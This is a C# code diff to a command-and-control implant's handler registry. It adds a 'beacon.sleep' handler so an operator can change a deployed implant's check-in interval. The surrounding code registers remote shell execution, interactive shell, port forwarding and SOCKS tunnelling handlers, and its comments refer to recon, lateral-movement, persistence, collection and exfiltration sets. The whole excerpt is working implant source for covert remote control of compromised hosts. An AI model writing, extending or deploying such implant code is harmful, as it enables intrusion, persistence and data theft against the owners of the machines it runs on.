@@ -19,17 +19,20 @@ internal static class HandlerSelection
     /// core baseline (shell, file push/pull) plus the recon, lateral,
     /// persist, collect, and exfil sets (architecture.md Sec 10.1), the
     /// lateral.move handler carrying the <paramref name="enroll"/> bundle
-    /// when child derivation is enabled. The channel verbs also register a
+    /// when child derivation is enabled, and beacon.sleep carrying the live
+    /// <paramref name="cadence"/> so an operator can retune a fielded
+    /// implant's check-in interval. The channel verbs also register a
     /// one-shot fallback so the verb stays dispatchable everywhere the
     /// registry is used: a path with no channel to carry it (a poll cycle,
     /// a future transport without streams) fails cleanly at the verb
     /// instead of losing it.
     /// </summary>
-    public static IReadOnlyList<ICapabilityHandler> Handlers(EnrollBundle? enroll) =>
+    public static IReadOnlyList<ICapabilityHandler> Handlers(EnrollBundle? enroll, Cadence? cadence = null) =>
     [
         new CapabilityHandler("shell.exec", args => Core.ShellExec(args)),
         new CapabilityHandler("shell.interact", _ =>
             (TaskOutcome.Failed, "shell.interact runs as a live channel; this dispatch path does not carry one")),
+        new CapabilityHandler("beacon.sleep", args => BeaconSleep.Set(args, cadence)),
         new CapabilityHandler("tunnel.forward", _ =>
             (TaskOutcome.Failed, "tunnel.forward runs as a live channel; this dispatch path does not carry one")),
         new CapabilityHandler("tunnel.socks", _ =>
